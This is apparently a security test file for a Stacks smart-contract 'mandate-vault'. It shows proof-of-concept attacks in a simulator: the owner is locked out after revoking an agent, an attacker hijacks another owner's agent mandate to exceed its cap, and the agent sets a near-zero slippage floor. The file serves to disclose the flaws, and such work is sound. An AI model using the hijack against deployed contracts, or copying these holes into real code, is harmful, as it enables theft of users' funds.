import { Cl } from "@stacks/transactions";
import { describe, expect, it } from "vitest";

const BF   = "SM1793C4R5PZ4NS4VQ4WMP7SKKYVH8JZEWSZ9HCCR";
const SBTC = "SM3VDXK3WZZSA84XXFKAFAF15NNZX32CTSG82JFQ4";

const a = simnet.getAccounts();
const alice  = a.get("wallet_1")!;   // honest owner
const mallory= a.get("wallet_2")!;   // attacker (also an owner)
const agentX = a.get("wallet_3")!;   // agent Alice trusts

const xTok = () => Cl.contractPrincipal(SBTC, "sbtc-token");
const pool = () => Cl.contractPrincipal(BF, "xyk-pool-sbtc-stx-v-1-1");
const yTok = () => Cl.contractPrincipal(BF, "token-stx-v-1-2");

const grant = (owner: string, agent: string, cap = 1_000_000, exp = 9_999_999) =>
  simnet.callPublicFn("mandate-vault", "grant",
    [Cl.principal(agent), Cl.uint(cap), Cl.uint(exp)], owner);

describe("ATTACK: revocation locks the owner out of their own funds", () => {
  it("withdraw fails after revoke -- funds are stranded", () => {
    grant(alice, agentX);
    const before = simnet.callPublicFn("mandate-vault", "withdraw",
      [xTok(), Cl.uint(1)], alice);
    console.log("  withdraw while mandate live :", Cl.prettyPrint(before.result));

    simnet.callPublicFn("mandate-vault", "revoke", [Cl.principal(agentX)], alice);

    const after = simnet.callPublicFn("mandate-vault", "withdraw",
      [xTok(), Cl.uint(1)], alice);
    console.log("  withdraw after revoke       :", Cl.prettyPrint(after.result));
    // revoke deletes the mandate, and withdraw REQUIRES a mandate to exist
    expect(after.result).toBeErr(Cl.uint(100)); // ERR_NO_MANDATE -> locked out
  });
});

describe("ATTACK: agent-of collision lets a stranger hijack an agent's mandate", () => {
  it("mallory redirects alice's agent to mallory's own mandate", { timeout: 180000 }, () => {
    grant(alice, agentX, 1_000_000);

    // mallory grants to the SAME agent principal, with a far larger cap
    grant(mallory, agentX, 999_999_999);

    // agentX now resolves to mallory, not alice
    const r = simnet.callPublicFn("mandate-vault", "execute",
      [pool(), xTok(), yTok(), Cl.uint(50_000_000), Cl.uint(1)], agentX);
    const repr = Cl.prettyPrint(r.result);
    console.log("  agentX trading 50M (alice cap was 1M):", repr);

    // If alice's 1M cap still bound the agent this would be u102 (TOO_LARGE).
    // It is not -- mallory's mandate now governs agentX.
    expect(repr).not.toBe("(err u102)");
  });
});

describe("DESIGN HOLE: the agent chooses its own slippage floor", () => {
  it("min-dy of 1 is accepted by the policy gate", { timeout: 180000 }, () => {
    grant(alice, agentX);
    const r = simnet.callPublicFn("mandate-vault", "execute",
      [pool(), xTok(), yTok(), Cl.uint(1000), Cl.uint(1)], agentX);
    const repr = Cl.prettyPrint(r.result);
    console.log("  min-dy=1 (accept ~any price):", repr);
    // the vault raises no objection -- it fails downstream at Bitflow, not at policy
    expect(["(err u100)","(err u101)","(err u102)","(err u103)"]).not.toContain(repr);
  });
});
